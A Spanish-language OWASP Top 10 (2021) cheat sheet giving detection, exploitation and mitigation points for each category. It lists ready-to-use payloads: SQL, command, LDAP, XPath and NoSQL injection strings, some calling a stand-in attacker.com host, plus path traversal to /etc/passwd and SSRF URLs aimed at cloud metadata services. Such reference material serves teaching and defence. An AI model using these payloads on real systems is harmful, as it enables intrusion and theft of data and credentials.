# OWASP Top 10 (2021) — Detalle Completo

## A01: Broken Access Control
**Detección:** Probar endpoints sin auth, cambiar IDs en URLs (IDOR), manipular JWT claims, forzar navegación a páginas protegidas.
**Explotación:**
- Modificar `user_id` en requests: `GET /api/users/123 → GET /api/users/124`
- Cambiar role en JWT: `{"role": "user"} → {"role": "admin"}`
- Acceder a endpoints administrativos sin sesión: `/admin`, `/dashboard`, `/api/internal/*`
- Directory traversal: `../../../etc/passwd`
- HTTP method tampering: cambiar GET a DELETE/PUT

**Mitigación:** RBAC en servidor, validar ownership en cada request, deny by default, JWT con claims mínimos.

## A02: Cryptographic Failures
**Detección:** HTTP sin TLS, cookies sin flag Secure/HttpOnly, algoritmos débiles (MD5, SHA1, DES), claves hardcodeadas.
**Explotación:**
- Sniffing tráfico HTTP con Wireshark
- Extraer cookies sin Secure flag via MITM
- Crackear hashes MD5 con rainbow tables
- Descifrar datos con claves encontradas en código

**Mitigación:** TLS 1.3+, AES-256-GCM, bcrypt/argon2 para passwords, HSTS, certificate pinning.

## A03: Injection
**SQL Injection:**
- Error-based: `' ORDER BY 1--`, `' UNION SELECT null,null--`
- Boolean-based: `' AND 1=1--` vs `' AND 1=2--`
- Time-based: `'; WAITFOR DELAY '0:0:5'--`
- Out-of-band: `'; EXEC xp_dirtask '\\attacker.com\share'--`

**Command Injection:**
- `; whoami`, `| cat /etc/passwd`, `$(id)`, `` `id` ``
- Blind: `; ping -c 5 attacker.com`

**LDAP Injection:** `*)(uid=*))(|(uid=*`
**XPath Injection:** `' or '1'='1`, `' or ''='`
**NoSQL Injection:** `{"username": {"$gt": ""}, "password": {"$gt": ""}}`

**Mitigación:** Parameterized queries, ORM, input validation, least privilege DB accounts.

## A04: Insecure Design
**Detección:** Falta de rate limiting, sin limitación de intentos de login, flujo de recuperación de contraseña débil, falta de validación de límites de negocio.
**Mitigación:** Threat modeling, secure design patterns, rate limiting, validación de límites.

## A05: Security Misconfiguration
**Detección:**
- Headers faltantes: CSP, HSTS, X-Content-Type-Options
- Default credentials: admin/admin, root/password
- Directory listing habilitado
- Stack traces expuestas
- `.env`, `.git`, `wp-config.php` accesibles
- Servicios innecesarios corriendo

**Mitigación:** Hardening checklist, eliminar defaults, deshabilitar debug en prod, escaneo automatizado.

## A06: Vulnerable and Outdated Components
**Detección:**
```bash
npm audit && npm audit fix
pip-audit
safety check
trivy image myapp:latest
grype myapp:latest
snyk test
```
**Mitigación:** Dependabot/Renovate, SBOM, escaneo en CI/CD, política de actualización.

## A07: Identification and Authentication Failures
**Detección:**
- Enumeración de usuarios via respuestas diferentes
- JWT sin firma o con algoritmo `none`
- Session fixation
- Credential stuffing sin rate limiting
- MFA bypass via API directa

**Mitigación:** MFA obligatorio, JWT RS256+, session rotation, rate limiting en login, account lockout.

## A08: Software and Data Integrity Failures
**Detección:**
- Deserialización insegura (Java, PHP, Python pickle)
- CDN sin SRI (Subresource Integrity)
- CI/CD pipeline sin verificación de integridad
- Auto-update sin firma

**Mitigación:** SRI hashes, firmar releases, evitar deserialización de datos no confiables, verificación de integridad en CI/CD.

## A09: Security Logging and Monitoring Failures
**Detección:**
- Logs sin eventos de auth
- Datos sensibles en logs (passwords, tokens)
- Sin alertas para intentos de acceso fallidos
- Sin retención de logs adecuada

**Mitigación:** SIEM, logs estructurados, alertas en tiempo real, retención mínima 90 días, no loggear PII.

## A10: Server-Side Request Forgery (SSRF)
**Detección:**
- `http://169.254.169.254/latest/meta-data/` (AWS)
- `http://metadata.google.internal/` (GCP)
- `http://169.254.169.254/metadata/instance` (Azure)
- `file:///etc/passwd`
- `gopher://localhost:6379/` (Redis)

**Mitigación:** Allowlist de URLs, deshabilitar redirects, bloquear acceso a metadata service, usar proxy forward.
